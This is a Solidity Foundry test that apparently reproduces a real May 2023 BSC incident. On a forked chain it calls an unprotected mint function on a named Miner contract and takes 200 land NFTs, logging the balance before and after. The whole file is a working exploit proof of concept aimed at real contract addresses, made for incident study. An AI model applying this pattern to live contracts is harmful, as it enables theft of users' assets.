// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 200 land NFT => 28,601 $XQJ  => 149,616 $BUSD
// Attack Tx : https://bscscan.com/tx/0xe4db1550e3aa78a05e93bfd8fbe21b6eba5cce50dc06688949ab479ebed18048
// @Analysis
// https://twitter.com/BeosinAlert/status/1658000784943124480?cxt=HHwWgMDU_b27s4IuAAAA
// https://twitter.com/BeosinAlert/status/1658002030953365505?cxt=HHwWgoDQvYGEtIIuAAAA
// @Summary
// Vulnerability: lack of permission control on mint

interface IMiner {
    function mint(address[] memory to, uint256[] memory value) external;
}

contract ContractTest is Test {
    IERC721 landNFT = IERC721(0x1a62fe088F46561bE92BB5F6e83266289b94C154);
    IMiner minerContract = IMiner(0x2e599883715D2f92468Fa5ae3F9aab4E930E3aC7);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_208_132);
        cheats.label(address(landNFT), "landNFT");
        cheats.label(address(minerContract), "Miner");
    }

    function testExploit() public {
        emit log_named_uint("Attacker amount of NFT land before mint", landNFT.balanceOf(address(this)));

        address[] memory to = new address[](1);
        to[0] = address(this);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 200;
        minerContract.mint(to, amount);

        emit log_named_uint("Attacker amount of NFT land after mint", landNFT.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
